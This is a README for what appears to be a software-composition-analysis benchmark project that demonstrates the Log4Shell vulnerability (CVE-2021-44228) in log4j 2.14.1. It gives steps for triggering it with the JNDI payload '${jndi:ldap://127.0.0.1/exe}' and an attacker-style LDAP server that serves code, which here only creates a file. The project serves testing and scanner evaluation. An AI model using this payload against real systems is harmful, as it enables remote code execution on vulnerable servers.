## log4shell true positive

This is a simple web project with a log4shell vulnerability. 
The project defines a simple `scabench.HelloWorldService` get service returning a plain text string `hello world`.
The service does not expect parameters, and if parameters are encountered, an error 
is logged. 

The vulnerable dependency is [org.apache.logging.log4j:log4j-core:2.14.1](https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core/2.14.1), the vulnerability is [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228). 


### Demonstrating the Vulnerability using a Test 

This requires unix or macos. It is easy to port this project to windows. 

A unit test is provided to demonstrate the vulnerability. The test requires a ldap server providing vulnerable code, the respective executable is provided by the project, it is defined in a separate project [https://github.com/jensdietrich/Log4J-RCE-Proof-Of-Concept](https://github.com/jensdietrich/Log4J-RCE-Proof-Of-Concept) based on [https://github.com/HyCraftHD/Log4J-RCE-Proof-Of-Concept](https://github.com/HyCraftHD/Log4J-RCE-Proof-Of-Concept).
The test fixture will handle startup and shutdown of the ldap server.

The test will create a file `foo` based on a command encoded embedded in the code of the ldap server the log4j connects to
(`touch foo`). This server can be controlled by an attacker. 

To run the test build the project with `mvn test`.

### Demonstrating the Vulnerability running the Application

1. start the embedded web server: `mvn jetty:run`
2. start the included the ldap server: `java -jar dodgy-ldap-server.jar` (the vulnerable copde will download Java code from this server)
3. point the browser to `http://localhost:8080/`, this site contains a pre-populated form with a malicious payload `${jndi:ldap://127.0.0.1/exe}`
4. submit this form
5. this will create a file `foo` on the server

### Running Software Composition Analyses

There are several sh scripts to run different analyses, result resports can be found in `scan-results`.

### Generating the SBOM

The `pom.xml` has a plugin to generate a [SBOM](https://www.cisa.gov/sbom) in [CycloneDX](https://cyclonedx.org/) format. 
To do this, run `mvn cyclonedx:makePackageBom`, the SBOM can be found in 
`target/` in `json` and `xml` format.

